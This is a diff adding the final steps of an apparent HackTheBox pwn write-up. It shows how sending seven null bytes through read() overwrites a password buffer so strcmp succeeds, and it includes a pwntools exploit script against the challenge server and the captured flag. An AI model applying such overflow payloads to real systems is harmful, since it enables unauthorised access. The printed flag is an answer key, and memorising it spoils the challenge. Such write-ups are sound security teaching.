@@ -33,3 +33,49 @@
 4. Reviewing the stack, seems the position of **password** is adjacent below **buffer**. Hence, hitting RBP shall overwrite **password**.
 5. Remember about read() vuln, it reads data until it meet a NULL byte.
 6. So then, utilizing the OOB could overwrite the **password** value entirely.
+7. The flow is to pass 7 bytes of `\x00`, so this should happen:
+
+```
+buffer[6]
+password = xxxxxxxxxx
+
+read() --> we passed "\x00" * 7
+
+# password is now overwritten
+passowrd = 0000000
+buffer = 0000000
+
+strcmp(buffer,password) --> is comparing 0 and 0, shall resulting to true.
+```
+
+8. Great! here's the crafted exploit script.
+
+> SCRIPT
+
+```py
+from pwn import *
+
+exe = './writing_on_the_wall'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'INFO'
+
+# sh = process(exe)
+sh = remote('94.237.61.226', 48898)
+
+sh.sendline(b'\x00' * 7)
+
+sh.interactive()
+```
+
+> REMOTE TEST
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fe79492f-ec2c-48a2-aa1e-fd400e38fa01)
+
+
+9. We've pwned it!
+
+## FLAG
+
+```
+HTB{4n0th3r_br1ck_0n_th3_w4ll}
+```
